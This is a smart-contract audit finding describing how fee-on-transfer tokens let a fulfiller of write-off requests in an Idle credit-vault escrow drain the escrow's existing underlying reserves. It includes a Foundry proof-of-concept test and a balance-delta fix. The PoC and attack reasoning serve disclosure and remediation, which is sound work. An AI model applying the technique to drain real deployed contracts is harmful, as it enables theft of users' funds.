### Title
Fee-on-transfer underlyings let a write-off fulfiller drain escrowed reserves - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary

`IdleCreditVaultWriteOffEscrow.fullfillWriteOffRequest` credits a fulfillment based on the requested `_underlyings` amount rather than the amount actually received by the escrow. When the vault’s configured underlying token charges a transfer fee, the fulfiller transfers `_underlyings`, but the escrow receives less; it then pays `_underlyings - exitFee` to the requester and transfers the escrowed tranche tokens to the fulfiller. If the escrow holds underlying reserves or accidental donations, the difference is taken from that pre-existing balance instead of the fulfillment failing.

### Finding Description

The credit-vault underlying token is configured during `IdleCreditVault.initialize`, which accepts an arbitrary ERC20 address without excluding fee-on-transfer tokens. [1](#0-0) 

The escrow binds itself to that same token through `underlying = _cdo.token()`. [2](#0-1) 

During fulfillment, the contract validates `_underlyings` against the request, deletes the request, and then calls `safeTransferFrom` for the nominal amount. [3](#0-2) 

It never measures `balanceOf(address(this))` before and after the incoming transfer. Instead, it pays the configured exit fee and `_underlyings - _totFee` to the requester as though the full nominal amount arrived. [4](#0-3) 

For a token with a 1% transfer fee and a 0.1% escrow exit fee, fulfilling a request for `U` causes approximately:

```text
incoming:  U * 99%
outgoing:  U * 99.9%
deficit:   U * 0.9%
```

The resulting net decrease of the escrow’s underlying balance is borne by any underlying already held by the escrow. Repeated fulfillments can consume that reserve until the remaining balance can no longer cover the outgoing payout, after which subsequent fulfillments revert.

### Impact Explanation

A write-off fulfiller can obtain escrowed tranche tokens while causing the requester’s payout to be sourced partly from unrelated underlying already held by the escrow. The theft is limited by the escrow’s excess underlying balance and by the token’s transfer-fee spread.

Without a pre-existing underlying balance, the same transaction normally reverts on the outgoing `safeTransfer`, making the direct theft conditional rather than universally exploitable.

### Likelihood Explanation

Likelihood is conditional on two facts:

1. A credit vault is initialized with a fee-on-transfer underlying.
2. The escrow has excess underlying, such as accidental direct transfers or prior accounting residue.

The issue is otherwise reachable by any fulfiller because `fullfillWriteOffRequest` is permissionless. No borrower, owner, manager, guardian, fee receiver, or queue misconduct is required.

### Recommendation

Measure the actual amount received and distribute only that amount:

```solidity
uint256 balanceBefore = underlyingToken.balanceOf(address(this));
underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
uint256 received = underlyingToken.balanceOf(address(this)) - balanceBefore;

if (received < currentRequest.underlyings) revert WrongRequest();

uint256 feeAmount = (received * exitFee) / FULL_VALUE;
underlyingToken.safeTransfer(feeReceiver, feeAmount);
underlyingToken.safeTransfer(_user, received - feeAmount);
```

Alternatively, explicitly document that fee-on-transfer tokens are unsupported and reject such deployments during vault initialization or factory configuration. The latter requires an external token-property check and is generally less reliable than balance-delta accounting.

### Proof of Concept

The following Foundry-style PoC demonstrates the accounting deficit with a fee-on-transfer ERC20. It assumes the vault, CDO, strategy, escrow, and a running epoch have already been deployed, and that the fulfiller holds valid tranche tokens.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IERC20Like {
    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract FeeOnTransferToken is IERC20Like {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public constant FEE_BPS = 100; // 1%

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 received = amount - (amount * FEE_BPS / 10_000);
        balanceOf[from] -= amount;
        balanceOf[to] += received;
    }

    function decimals() external pure returns (uint8) {
        return 6;
    }
}

contract FeeOnTransferEscrowTest is Test {
    IdleCreditVaultWriteOffEscrow escrow;
    FeeOnTransferToken underlying;
    IERC20Like tranche;

    address lender = address(0xA);
    address fulfiller = address(0xB);

    function testFulfillmentConsumesEscrowReserve() public {
        uint256 requested = 1_000e6;
        uint256 trancheAmount = 1e18;

        // Existing unrelated underlying held by the escrow.
        underlying.mint(address(escrow), 100e6);

        // Lender creates a write-off request while the epoch is running.
        vm.prank(lender);
        tranche.approve(address(escrow), trancheAmount);

        vm.prank(lender);
        escrow.createWriteOffRequest(trancheAmount, requested);

        uint256 escrowBefore = underlying.balanceOf(address(escrow));
        uint256 lenderBefore = underlying.balanceOf(lender);

        underlying.mint(fulfiller, requested);
        vm.prank(fulfiller);
        underlying.approve(address(escrow), requested);

        vm.prank(fulfiller);
        escrow.fullfillWriteOffRequest(lender, trancheAmount, requested);

        uint256 escrowAfter = underlying.balanceOf(address(escrow));
        uint256 lenderAfter = underlying.balanceOf(lender);

        // The escrow receives only 99% because of the transfer fee.
        // It still pays out requested - exitFee, causing a net reserve loss.
        assertEq(lenderAfter - lenderBefore, requested * 99_900 / 100_000);
        assertLt(escrowAfter, escrowBefore);
        assertEq(tranche.balanceOf(fulfiller), trancheAmount);
    }
}
```

The essential invariant failure is that `pendingUnderlyings` and `userRequests` are cleared before validating the amount actually received, while the outgoing distribution uses the nominal requested amount rather than the received amount.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L123-139)
```text
  /// @param _underlyingToken address of the underlying token (pool currency)
  function initialize(
    address _underlyingToken,
    address _owner,
    address _manager,
    address _borrower,
    string memory borrowerName,
    uint256 _apr
  ) public virtual initializer {
    OwnableUpgradeable.__Ownable_init();
    ReentrancyGuardUpgradeable.__ReentrancyGuard_init();
    require(token == address(0), "Token is already initialized");

    //----- // -------//
    token = _underlyingToken;
    underlyingToken = IERC20Detailed(token);
    tokenDecimals = underlyingToken.decimals();
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L72-78)
```text
    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(_idleCDOEpoch);
    idleCDOEpoch = _idleCDOEpoch;
    strategy = _cdo.strategy();
    underlying = _cdo.token();
    tranche = _isAATranche ? _cdo.AATranche() : _cdo.BBTranche();
    borrower = IdleCreditVault(strategy).borrower();
    exitFee = 100; // 0.1%
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L123-139)
```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L140-151)
```text
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
